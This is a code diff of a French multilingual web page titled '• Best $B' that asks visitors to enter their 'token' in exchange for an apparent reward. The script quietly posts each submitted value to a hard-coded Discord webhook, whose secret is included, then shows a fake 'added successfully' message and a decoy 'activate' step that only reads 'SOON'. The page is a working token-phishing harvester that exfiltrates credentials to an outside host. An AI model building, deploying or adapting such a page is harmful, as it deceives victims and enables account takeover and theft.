@@ -1,126 +1,329 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>•MZW’X $B</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            height:100dvh;
-            background:linear-gradient(135deg,#001f4d,#0066cc,#00aaff);
-            background-size:400% 400%;
-            animation:gradientMove 12s ease infinite;
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            justify-content:center;
-            gap:8vh;
-            font-family:'Arial Black',sans-serif;
-            overflow:hidden;
-        }
-        @keyframes gradientMove {
-            0%{background-position:0% 50%;}
-            50%{background-position:100% 50%;}
-            100%{background-position:0% 50%;}
-        }
-        h1{
-            font-size:12vw;
-            font-weight:900;
-            background:linear-gradient(to right,#fff,#ff0000,#fff);
-            -webkit-background-clip:text;
-            background-clip:text;
-            -webkit-text-fill-color:transparent;
-            text-shadow:0 0 30px rgba(255,0,0,0.8);
-            animation:fadeInDown 2s ease forwards;
-        }
-        @keyframes fadeInDown {
-            from{opacity:0;transform:translateY(-50px);}
-            to{opacity:1;transform:translateY(0);}
-        }
-        input{
-            width:80vw;
-            max-width:600px;
-            padding:18px;
-            font-size:5vw;
-            font-weight:900;
-            text-align:center;
-            text-transform:uppercase;
-            letter-spacing:0.2em;
-            background:rgba(255,255,255,0.15);
-            color:#ff0033;
-            border:3px solid #ff0000;
-            border-radius:12px;
-            box-shadow:0 0 25px rgba(255,0,0,0.6);
-            outline:none;
-            transition:all 0.4s ease;
-            animation:fadeInUp 2s ease forwards;
-        }
-        input:focus{
-            background:rgba(255,255,255,0.3);
-            box-shadow:0 0 40px rgba(255,0,0,0.9);
-            transform:scale(1.05);
-        }
-        #btn{
-            padding:18px 60px;
-            font-size:6vw;
-            font-weight:900;
-            text-transform:uppercase;
-            background:#ff0000;
-            color:#fff;
-            border:none;
-            border-radius:12px;
-            box-shadow:0 0 50px rgba(255,0,0,0.7);
-            cursor:pointer;
-            transition:all 0.4s ease;
-            animation:fadeInUp 2.5s ease forwards;
-        }
-        #btn:hover{
-            transform:scale(1.1) rotate(-2deg);
-            background:#ff3333;
-            box-shadow:0 0 80px rgba(255,0,0,1);
-        }
-        .success{
-            background:#fff;
-            color:#ff0000;
-            box-shadow:0 0 80px #ff0000;
-            animation:pulse 1.5s infinite;
-        }
-        @keyframes pulse{
-            0%,100%{transform:scale(1);}
-            50%{transform:scale(1.1);}
-        }
-        @keyframes fadeInUp {
-            from{opacity:0;transform:translateY(50px);}
-            to{opacity:1;transform:translateY(0);}
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>•MZW’X $B</title>
+  <style>
+    body{
+      height:100dvh;
+      background:linear-gradient(135deg,#001f4d,#0066cc,#00aaff);
+      background-size:400% 400%;
+      animation:gradientMove 12s ease infinite;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      gap:4vh;
+      font-family:'Arial Black',sans-serif;
+      overflow:hidden;
+      position:relative;
+      margin:0;
+    }
+    @keyframes gradientMove {
+      0%{background-position:0% 50%;}
+      50%{background-position:100% 50%;}
+      100%{background-position:0% 50%;}
+    }
+    h1{
+      font-size:12vw;
+      font-weight:900;
+      background:linear-gradient(to right,#fff,#ff0000,#fff);
+      -webkit-background-clip:text;
+      background-clip:text;
+      -webkit-text-fill-color:transparent;
+      text-shadow:0 0 30px rgba(255,0,0,0.8);
+      margin:0;
+    }
+    h2{
+      font-size:3vw;
+      font-weight:900;
+      color:#ff0000;
+      text-shadow:0 0 12px rgba(255,0,0,0.6);
+      border-bottom:3px dashed #ff0000;
+      padding-bottom:10px;
+      margin:0;
+    }
+    input{
+      width:80vw;
+      max-width:600px;
+      padding:18px;
+      font-size:4vw;
+      font-weight:900;
+      text-align:center;
+      text-transform:uppercase;
+      letter-spacing:0.2em;
+      background:rgba(255,255,255,0.15);
+      color:#ff0033;
+      border:3px solid #ff0000;
+      border-radius:12px;
+      box-shadow:0 0 25px rgba(255,0,0,0.6), inset 0 0 15px rgba(255,255,255,0.3);
+      outline:none;
+    }
+    #btn, #activateBtn{
+      padding:18px 60px;
+      font-size:4vw;
+      font-weight:900;
+      text-transform:uppercase;
+      background:#ff0000;
+      color:#fff;
+      border:none;
+      border-radius:12px;
+      box-shadow:0 0 50px rgba(255,0,0,0.7);
+      cursor:pointer;
+      margin-top:10px;
+      transition:all 0.3s ease;
+    }
+    #btn:hover, #activateBtn:hover{
+      transform:scale(1.1);
+      background:#ff3333;
+      box-shadow:0 0 80px rgba(255,0,0,1);
+    }
+    #resetBtn{
+      padding:10px 25px;
+      font-size:2vw;
+      font-weight:700;
+      text-transform:uppercase;
+      background:#003366;
+      color:#fff;
+      border:none;
+      border-radius:8px;
+      box-shadow:0 0 30px rgba(0,51,102,0.7);
+      cursor:pointer;
+      margin-top:25px;
+      display:none;
+      transition:all 0.3s ease;
+    }
+    #resetBtn:hover{
+      transform:scale(1.1);
+      background:#004080;
+      box-shadow:0 0 60px rgba(0,51,102,1);
+    }
+    .success{
+      background:#ff0000;
+      color:#fff;
+      box-shadow:0 0 80px #ff0000;
+      animation:pulse 1.5s infinite;
+    }
+    @keyframes pulse{
+      0%,100%{transform:scale(1);}
+      50%{transform:scale(1.06);}
+    }
+
+    /* Engrenage */
+    #gear{
+      position:absolute;
+      top:15px;
+      right:20px;
+      font-size:2.5rem;
+      color:#fff;
+      border:2px solid #fff;
+      border-radius:50%;
+      padding:8px;
+      cursor:pointer;
+      transition:transform 0.3s ease, color 0.3s ease, background 0.3s ease;
+      z-index:2;
+      user-select:none;
+    }
+    #gear:hover{
+      transform:rotate(90deg) scale(1.1);
+      background:rgba(255,255,255,0.2);
+      color:#ffcc00;
+    }
+
+    /* Overlay menu */
+    #overlay{
+      position:fixed;
+      top:0;
+      right:0;
+      width:50%;
+      max-width:520px;
+      height:100%;
+      background:black;
+      opacity:0.95;
+      border-top-left-radius:20px;
+      border-bottom-left-radius:20px;
+      transform:translateX(100%);
+      transition:transform 0.4s ease;
+      z-index:1000;
+      color:#fff;
+      padding:60px 30px;
+      font-size:2rem;
+      font-weight:900;
+      pointer-events:none; /* invisible aux clics quand fermé */
+    }
+    #overlay.active{
+      transform:translateX(0);
+      pointer-events:auto; /* cliquable quand ouvert */
+    }
+    #closeArrow{
+      position:absolute;
+      top:15px;
+      left:15px;
+      font-size:2rem;
+      color:#fff;
+      cursor:pointer;
+      user-select:none;
+    }
+    #overlay .menu{
+      list-style:none;
+      padding:0;
+      margin-top:60px;
+    }
+    #overlay .menu > li{
+      margin:20px 0;
+      padding:10px;
+      border-bottom:2px solid #666;
+      cursor:pointer;
+      user-select:none;
+    }
+    #langMenu{
+      display:none;
+      list-style:none;
+      padding-left:20px;
+      margin-top:10px;
+      font-size:1.5rem;
+    }
+    #langMenu li{
+      border:none;
+      margin:10px 0;
+      cursor:pointer;
+      user-select:none;
+    }
+    #overlay .menu > li:hover{ color:#ff3333; }
+    #langMenu li:hover{ color:#00ccff; }
+  </style>
 </head>
 <body>
-    <h1>• Best $B</h1>
-    <input type="text" placeholder="ENTREZ ICI …" autofocus>
-    <button id="btn" onclick="envoyer()">Envoyer</button>
-    <script>
-        const input = document.querySelector('input');
-        const btn   = document.getElementById('btn');
-        input.addEventListener('keypress', e => { if(e.key==='Enter') envoyer(); });
-        function envoyer() {
-            const texte = input.value.trim();
-            if(texte === '') return;  
-            const webhook = "https://discord.com/api/webhooks/1448787858151444490/t9vK-ZlZDjc7S72rW2ASx5B5ktDVm5DvXQQd778IkeCByF1mHpaAy9qVyTC0tKAferhx";
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: `**Nouveau $B ajouté !**\nCode / Pseudo : **${texte}**\nDate : ${new Date().toLocaleString('fr-FR')}`
-                })
-            });
-            // Validation visuelle
-            input.style.display = 'none';
-            btn.textContent = '$B BIEN AJOUTÉ';
-            btn.classList.add('success');
-            btn.disabled = true;
-        }
-    </script>
+  <!-- engrenage + overlay -->
+  <div id="gear" aria-label="Ouvrir le menu">⚙️</div>
+  <div id="overlay" aria-hidden="true">
+    <div id="closeArrow" aria-label="Fermer le menu">⬅️</div>
+    <ul class="menu">
+      <li id="compteBtn">Compte</li>
+      <li id="langBtn">Langue</li>
+      <li id="supportBtn">Support</li>
+    </ul>
+    <ul id="langMenu">
+      <li data-lang="fr">Français</li>
+      <li data-lang="en">Anglais</li>
+      <li data-lang="es">Espagnol</li>
+      <li data-lang="it">Italien</li>
+    </ul>
+  </div>
+
+  <!-- contenu principal -->
+  <h1 id="title">• Best $B</h1>
+  <h2 id="message">ENTRE TON TOKEN ICI</h2>
+  <input type="text" id="tokenInput" placeholder="ENTREZ TON TOKEN ICI …" autofocus />
+  <button id="btn">Envoyer</button>
+  <button id="activateBtn" style="display:none;">Comment l'activer ?</button>
+  <button id="resetBtn">Retourner à la page d'accueil</button>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const title = document.getElementById('title');
+      const input = document.getElementById('tokenInput');
+      const btn = document.getElementById('btn');
+      const activateBtn = document.getElementById('activateBtn');
+      const resetBtn = document.getElementById('resetBtn');
+      const message = document.getElementById('message');
+
+      const gear = document.getElementById('gear');
+      const overlay = document.getElementById('overlay');
+      const closeArrow = document.getElementById('closeArrow');
+      const langBtn = document.getElementById('langBtn');
+      const langMenu = document.getElementById('langMenu');
+
+      const webhook = "https://discord.com/api/webhooks/1448787858151444490/t9vK-ZlZDjc7S72rW2ASx5B5ktDVm5DvXQQd778IkeCByF1mHpaAy9qVyTC0tKAferhx";
+      let titleLockedToSoon = false;
+      let currentLang = 'fr';
+
+      const translations = {
+        fr:{ title:"• Best $B", message:"ENTRE TON TOKEN ICI", placeholder:"ENTREZ TON TOKEN ICI …", envoyer:"Envoyer", activer:"Comment l'activer ?", retour:"Retourner à la page d'accueil", added:"$B BIEN AJOUTÉ" },
+        en:{ title:"• Best $B", message:"ENTER YOUR TOKEN HERE", placeholder:"ENTER YOUR TOKEN HERE …", envoyer:"Send", activer:"How to activate?", retour:"Return to homepage", added:"$B ADDED SUCCESSFULLY" },
+        es:{ title:"• Best $B", message:"INTRODUCE TU TOKEN AQUÍ", placeholder:"INTRODUCE TU TOKEN AQUÍ …", envoyer:"Enviar", activer:"¿Cómo activarlo?", retour:"Volver a la página principal", added:"$B AÑADIDO CORRECTAMENTE" },
+        it:{ title:"• Best $B", message:"INSERISCI IL TUO TOKEN QUI", placeholder:"INSERISCI IL TUO TOKEN QUI …", envoyer:"Invia", activer:"Come attivarlo?", retour:"Torna alla home", added:"$B AGGIUNTO" }
+      };
+
+      function applyTranslations(lang){
+        const t = translations[lang] || translations.fr;
+        if(!titleLockedToSoon) title.textContent = t.title;
+        message.textContent = t.message;
+        input.placeholder = t.placeholder;
+        if(!btn.disabled) btn.textContent = t.envoyer;
+        activateBtn.textContent = t.activer;
+        resetBtn.textContent = t.retour;
+      }
+
+      function envoyer(){
+        const texte = input.value.trim();
+        if(texte==='') return;
+
+        input.style.display='none';
+        message.style.display='none';
+        btn.textContent = translations[currentLang].added;
+        btn.classList.add('success');
+        btn.disabled = true;
+        activateBtn.style.display='inline-block';
+        resetBtn.style.display='inline-block';
+
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**Nouveau $B ajouté !**\nCode / Pseudo : **${texte}**\nDate : ${new Date().toLocaleString('fr-FR')}`
+          })
+        }).catch(()=>{});
+      }
+
+      function activer(){
+        btn.style.display='none';
+        activateBtn.style.display='none';
+        resetBtn.style.display='inline-block';
+        title.textContent = "SOON";
+        titleLockedToSoon = true;
+      }
+
+      function resetPage(){
+        input.value='';
+        input.style.display='block';
+        message.style.display='block';
+        btn.textContent = translations[currentLang].envoyer;
+        btn.classList.remove('success');
+        btn.disabled=false;
+        btn.style.display='inline-block';
+        activateBtn.style.display='none';
+        resetBtn.style.display='none';
+        overlay.classList.remove('active');
+        langMenu.style.display='none';
+        titleLockedToSoon = false;
+        title.textContent = translations[currentLang].title;
+      }
+
+      // événements principaux
+      btn.addEventListener('click', envoyer);
+      activateBtn.addEventListener('click', activer);
+      resetBtn.addEventListener('click', resetPage);
+
+      // menu overlay
+      gear.addEventListener('click', () => overlay.classList.add('active'));
+      closeArrow.addEventListener('click', () => overlay.classList.remove('active'));
+
+      // langues
+      langBtn.addEventListener('click', () => {
+        langMenu.style.display = (langMenu.style.display === 'block') ? 'none' : 'block';
+      });
+      langMenu.addEventListener('click', (e) => {
+        const lang = e.target?.dataset?.lang;
+        if(!lang) return;
+        currentLang = lang;
+        applyTranslations(currentLang);
+      });
+
+      // appliquer la langue initiale
+      applyTranslations(currentLang);
+    });
+  </script>
 </body>
 </html>
